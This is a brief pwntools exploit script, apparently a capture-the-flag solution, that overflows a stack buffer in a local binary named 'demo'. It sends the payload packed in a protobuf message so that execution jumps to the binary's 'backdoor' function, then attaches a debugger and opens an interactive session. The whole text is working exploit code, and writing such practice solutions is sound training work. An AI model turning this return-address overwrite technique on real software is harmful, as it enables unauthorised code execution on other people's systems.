from pwn import *
import ctf_pb2
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux',  'splitw',  '-h', '-p', '80'])
p = process("./demo")
elf = ELF("./demo")

over  = b'a' * 0x28 + p64(elf.sym['backdoor'])

payload = ctf_pb2.demo_ms()
payload.demo_content = over
payload.demo_size = 0x30

gdb.attach(p, 'b *0x40155A')
p.recvuntil('demo:')
p.send(payload.SerializeToString())
p.interactive()